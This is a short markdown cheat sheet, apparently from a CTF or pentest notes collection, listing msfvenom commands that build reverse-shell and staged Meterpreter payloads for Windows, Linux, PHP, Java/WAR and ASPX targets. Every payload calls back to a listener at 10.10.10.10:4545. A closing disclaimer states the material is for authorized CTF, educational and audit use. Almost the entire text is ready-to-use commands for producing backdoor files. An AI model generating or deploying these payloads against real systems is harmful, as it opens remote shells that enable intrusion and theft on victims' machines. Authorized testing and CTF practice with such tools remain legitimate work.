# MSFvenom Payload Reference

### Windows (.exe)
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > win_rshell_10.10.10.10_4545.exe
```
### Linux (.elf)
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f elf > lin_rshell_10.10.10.10_4545.elf
```
### PHP
```
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4545 -f raw > php_rshell_10.10.10.10_4545.php
```
### Java (.war / JSP)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f raw > war_rshell_10.10.10.10_4545.war
```
### ASPX
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f aspx > aspx_rshell_10.10.10.10_4545.aspx
```
## Meterpreter Staged Payloads

### Windows (.exe)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > win_met_10.10.10.10_4545.exe
```
### Linux (.elf)
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f elf > lin_met_10.10.10.10_4545.elf
```
### PHP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f raw > php_met_10.10.10.10_4545.php
```
### Java (.war)
```
msfvenom -p java/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4545 -f raw > war_met_10.10.10.10_4545.war
```
### ASPX
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f aspx > aspx_met_10.10.10.10_4545.aspx
```
<div align="center">

### Legal Disclaimer

**Maintained & Curated by 5kullk3r**

*This material is maintained and curated for authorized Capture The Flag (CTF) challenges, educational & ethical purposes, and legal security auditing with explicit permission.*

*Some content may have been collected or adapted from publicly available resources and/or third-party sources. No claim of original authorship or ownership is made over such material unless explicitly stated. Credit and attribution belong to the respective original authors or sources where applicable.*

<sub>Unauthorized system access is illegal. **5kullk3r** does not claim ownership of third-party content and disclaims all liability for any misuse or damages.</sub>

</div>
